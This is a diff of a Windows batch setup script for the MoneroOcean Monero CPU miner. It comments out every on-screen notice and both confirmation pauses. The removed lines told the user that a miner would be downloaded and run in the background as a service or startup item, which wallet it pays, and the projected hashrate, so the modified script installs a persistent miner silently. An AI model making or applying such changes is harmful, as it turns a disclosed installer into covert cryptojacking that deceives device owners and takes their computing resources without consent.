@@ -4,9 +4,9 @@ set VERSION=2.1
 
 rem printing greetings
 
-echo MoneroOcean mining setup script v%VERSION%.
-echo ^(please report issues to support@moneroocean.stream email^)
-echo.
+rem echo MoneroOcean mining setup script v%VERSION%.
+rem echo ^(please report issues to support@moneroocean.stream email^)
+rem echo.
 
 net session >nul 2>&1
 if %errorLevel% == 0 (set ADMIN=1) else (set ADMIN=0)
@@ -164,27 +164,27 @@ rem printing intentions
 
 set "LOGFILE=%USERPROFILE%\moneroocean\xmrig.log"
 
-echo I will download, setup and run in background Monero CPU miner with logs in %LOGFILE% file.
-echo If needed, miner in foreground can be started by %USERPROFILE%\moneroocean\miner.bat script.
-echo Mining will happen to %WALLET% wallet.
+rem echo I will download, setup and run in background Monero CPU miner with logs in %LOGFILE% file.
+rem echo If needed, miner in foreground can be started by %USERPROFILE%\moneroocean\miner.bat script.
+rem echo Mining will happen to %WALLET% wallet.
 
 if not [%EMAIL%] == [] (
-  echo ^(and %EMAIL% email as password to modify wallet options later at https://moneroocean.stream site^)
+rem   echo ^(and %EMAIL% email as password to modify wallet options later at https://moneroocean.stream site^)
 )
 
-echo.
+rem echo.
 
 if %ADMIN% == 0 (
-  echo Since I do not have admin access, mining in background will be started using your startup directory script and only work when your are logged in this host.
+rem   echo Since I do not have admin access, mining in background will be started using your startup directory script and only work when your are logged in this host.
 ) else (
-  echo Mining in background will be performed using moneroocean_miner service.
+rem   echo Mining in background will be performed using moneroocean_miner service.
 )
 
-echo.
-echo JFYI: This host has %CPU_THREADS% CPU threads with %CPU_MHZ% MHz and %TOTAL_CACHE%KB data cache in total, so projected Monero hashrate is around %EXP_MONERO_HASHRATE% H/s.
-echo.
+rem echo.
+rem echo JFYI: This host has %CPU_THREADS% CPU threads with %CPU_MHZ% MHz and %TOTAL_CACHE%KB data cache in total, so projected Monero hashrate is around %EXP_MONERO_HASHRATE% H/s.
+rem echo.
 
-pause
+rem pause
 
 rem start doing stuff: preparing miner
 
@@ -399,7 +399,7 @@ goto OK
 :OK
 echo
 echo [*] Setup complete
-pause
+rem pause
 exit /b 0
 
 :strlen string len
